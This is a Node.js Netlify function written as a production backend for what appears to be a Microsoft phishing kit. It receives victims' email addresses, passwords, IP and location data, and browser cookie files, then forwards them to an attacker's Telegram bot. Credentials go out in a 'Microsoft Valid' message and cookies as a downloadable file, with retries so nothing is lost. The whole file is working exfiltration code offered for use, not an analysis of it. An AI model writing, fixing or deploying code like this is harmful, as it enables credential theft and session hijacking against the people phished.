/**
 * PRODUCTION-READY: Telegram Bot Function for Netlify
 * FIXED: Sends cookies as downloadable TXT file using multipart/form-data
 */

const https = require('https');

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

function sendMessageToTelegram(text, parseMode = 'HTML') {
  return new Promise((resolve, reject) => {
    const postData = JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: text,
      parse_mode: parseMode,
      disable_web_page_preview: true
    });

    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      },
      timeout: 15000
    };

    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        try {
          const response = JSON.parse(data);
          if (res.statusCode === 200 && response.ok) {
            console.log('✅ [TELEGRAM] Message sent');
            resolve(response);
          } else {
            reject(new Error(`Telegram API error: ${response.description || 'Unknown error'}`));
          }
        } catch (e) {
          reject(new Error(`Failed to parse Telegram response: ${e.message}`));
        }
      });
    });

    req.on('error', (error) => {
      console.error(`❌ [TELEGRAM] Message send error: ${error.message}`);
      reject(error);
    });

    req.on('timeout', () => {
      req.destroy();
      reject(new Error('Telegram request timeout'));
    });

    req.write(postData);
    req.end();
  });
}

// ✅ FIXED: Send file as multipart/form-data (proper file upload)
function sendDocumentToTelegram(fileContent, fileName) {
  return new Promise((resolve, reject) => {
    const boundary = '----WebKitFormBoundary' + Math.random().toString(36).substring(2, 15);
    
    let body = `--${boundary}\r\n`;
    body += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
    body += `${TELEGRAM_CHAT_ID}\r\n`;
    body += `--${boundary}\r\n`;
    body += `Content-Disposition: form-data; name="document"; filename="${fileName}"\r\n`;
    body += `Content-Type: text/plain\r\n\r\n`;
    body += fileContent;
    body += `\r\n--${boundary}--\r\n`;

    const bodyBuffer = Buffer.from(body, 'utf8');

    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
      method: 'POST',
      headers: {
        'Content-Type': `multipart/form-data; boundary=${boundary}`,
        'Content-Length': bodyBuffer.length
      },
      timeout: 15000
    };

    console.log('📤 [TELEGRAM] Sending document via multipart/form-data...');
    console.log('File name:', fileName);
    console.log('Content length:', fileContent.length);

    const req = https.request(options, (res) => {
      let data = '';
      console.log('📥 [TELEGRAM] Response status:', res.statusCode);
      
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        try {
          const response = JSON.parse(data);
          console.log('📥 [TELEGRAM] Response:', JSON.stringify(response));
          
          if (res.statusCode === 200 && response.ok) {
            console.log('✅ [TELEGRAM] Document sent successfully as downloadable file');
            resolve(response);
          } else {
            console.error('❌ [TELEGRAM] API rejected:', response.description);
            reject(new Error(`Telegram API error: ${response.description || 'Unknown error'}`));
          }
        } catch (e) {
          console.error('❌ [TELEGRAM] Parse error:', e.message, 'Data:', data);
          reject(new Error(`Failed to parse Telegram response: ${e.message}`));
        }
      });
    });

    req.on('error', (error) => {
      console.error(`❌ [TELEGRAM] Document send error: ${error.message}`);
      reject(error);
    });

    req.on('timeout', () => {
      console.error('❌ [TELEGRAM] Document send timeout');
      req.destroy();
      reject(new Error('Telegram request timeout'));
    });

    req.write(bodyBuffer);
    req.end();
  });
}

function formatMainMessage(data) {
  const escapeHtml = (text) => {
    if (!text) return '';
    return String(text)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;');
  };

  let message = '<b>✅ Microsoft Valid</b>\n\n';

  if (data.email) {
    message += `👤:- ${escapeHtml(data.email)}\n`;
  }
  if (data.password) {
    message += `🔑:- ${escapeHtml(data.password)}\n`;
  }

  if (data.locationData && data.locationData.ip) {
    message += `\n<b>🌍 Location:</b>\n`;
    message += `IP:- ${escapeHtml(data.locationData.ip)}\n`;
    if (data.locationData.city) message += `City:- ${escapeHtml(data.locationData.city)}\n`;
    if (data.locationData.region) message += `Region:- ${escapeHtml(data.locationData.region)}\n`;
    if (data.locationData.country) message += `Country:- ${escapeHtml(data.locationData.country)}\n`;
    if (data.locationData.timezone) message += `Timezone:- ${escapeHtml(data.locationData.timezone)}\n`;
    if (data.locationData.isp) message += `ISP:- ${escapeHtml(data.locationData.isp)}\n`;
  }

  message += `\nBrowser:- chrome\n`;
  message += `\n⏰ ${new Date().toISOString()}\n`;

  return message;
}

function formatCookieMessage(cookieFile) {
  return cookieFile.content;
}

function splitMessage(message, maxLength = 4096) {
  const messages = [];
  let currentIndex = 0;

  while (currentIndex < message.length) {
    messages.push(message.substring(currentIndex, currentIndex + maxLength));
    currentIndex += maxLength;
  }

  return messages.length > 0 ? messages : [message];
}

async function sendWithRetry(sendFn, maxRetries = 3, initialDelay = 2000) {
  let lastError;
  
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      console.log(`🔄 [RETRY] Attempt ${attempt + 1}/${maxRetries + 1}`);
      const result = await sendFn();
      return result;
    } catch (error) {
      lastError = error;
      console.error(`❌ [RETRY] Attempt ${attempt + 1} failed: ${error.message}`);
      
      if (attempt < maxRetries) {
        const delay = initialDelay * Math.pow(2, attempt);
        console.log(`⏳ [RETRY] Waiting ${delay}ms before retry...`);
        await new Promise(resolve => setTimeout(resolve, delay));
      }
    }
  }

  throw lastError;
}

exports.handler = async (event, context) => {
  console.log('═══════════════════════════════════════════');
  console.log('🚀 [HANDLER] Starting sendTelegram handler');
  console.log(`📅 [HANDLER] Time: ${new Date().toISOString()}`);
  console.log('═══════════════════════════════════════════');

  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type, Accept',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Content-Type': 'application/json'
  };

  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ message: 'OK' })
    };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  try {
    let requestData;
    try {
      requestData = JSON.parse(event.body || '{}');
    } catch (error) {
      console.error('❌ JSON parse error:', error);
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'Invalid JSON in request body' })
      };
    }

    const { email, password, cookies = [], locationData = {}, cookieFiles = {} } = requestData;

    console.log('📊 [HANDLER] Received data:', {
      email: !!email,
      password: !!password,
      cookieCount: cookies.length,
      locationData: !!locationData.ip,
      hasCookieFile: !!cookieFiles.jsonFile,
      cookieFileName: cookieFiles.jsonFile?.name,
      cookieFileSize: cookieFiles.jsonFile?.size
    });

    if (!email && !password && cookies.length === 0) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'No meaningful data provided' })
      };
    }

    let credentialsSent = false;
    let cookiesSent = false;

    // ✅ MESSAGE 1: Send credentials
    console.log('═══════════════════════════════════════════');
    console.log('📨 [HANDLER] Sending credentials message...');
    console.log('═══════════════════════════════════════════');
    
    try {
      const credentialsMessage = formatMainMessage(requestData);
      const credentialsMessages = splitMessage(credentialsMessage);

      for (const msg of credentialsMessages) {
        await sendWithRetry(() => sendMessageToTelegram(msg));
      }

      credentialsSent = true;
      console.log('✅ [HANDLER] Credentials message sent successfully');
    } catch (error) {
      console.error('❌ [HANDLER] Failed to send credentials:', error.message);
    }

    // ✅ MESSAGE 2: Send cookies as DOWNLOADABLE FILE
    console.log('═══════════════════════════════════════════');
    console.log('📦 [HANDLER] Checking cookie file...');
    console.log('═══════════════════════════════════════════');

    if (cookieFiles && cookieFiles.jsonFile && cookieFiles.jsonFile.content) {
      try {
        console.log('✅ Cookie file detected');
        console.log(`📄 File: ${cookieFiles.jsonFile.name}`);
        console.log(`📊 Size: ${cookieFiles.jsonFile.size} bytes`);

        const cookieContent = formatCookieMessage(cookieFiles.jsonFile);
        const fileName = `${cookieFiles.jsonFile.name}`;

        console.log('📤 Sending cookies as downloadable TXT file...');
        
        // ✅ Send as document via multipart/form-data
        await sendWithRetry(() => sendDocumentToTelegram(cookieContent, fileName));

        cookiesSent = true;
        console.log('✅ [HANDLER] Cookie file sent successfully as downloadable');
      } catch (error) {
        console.error('❌ [HANDLER] Failed to send cookies:', error.message);
        console.error('Stack:', error.stack);
      }
    } else {
      console.log('⚠️ [HANDLER] No cookie file data');
      console.log('🔍 [DEBUG] cookieFiles:', JSON.stringify(cookieFiles, null, 2));
    }

    console.log('═══════════════════════════════════════════');
    console.log('✅ [HANDLER] Request completed successfully');
    console.log('═══════════════════════════════════════════');

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        message: 'All data transmitted to Telegram successfully',
        timestamp: new Date().toISOString(),
        transmitted: {
          credentials: credentialsSent,
          cookieFile: cookiesSent,
          email: !!email,
          cookies: cookies.length,
          location: !!locationData.ip
        }
      })
    };

  } catch (error) {
    console.error('═══════════════════════════════════════════');
    console.error('❌❌❌ HANDLER FATAL ERROR');
    console.error('═══════════════════════════════════════════');
    console.error('Message:', error.message);
    console.error('Stack:', error.stack);
    console.error('═══════════════════════════════════════════');
    
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: 'Server error',
        message: error.message,
        timestamp: new Date().toISOString()
      })
    };
  }
};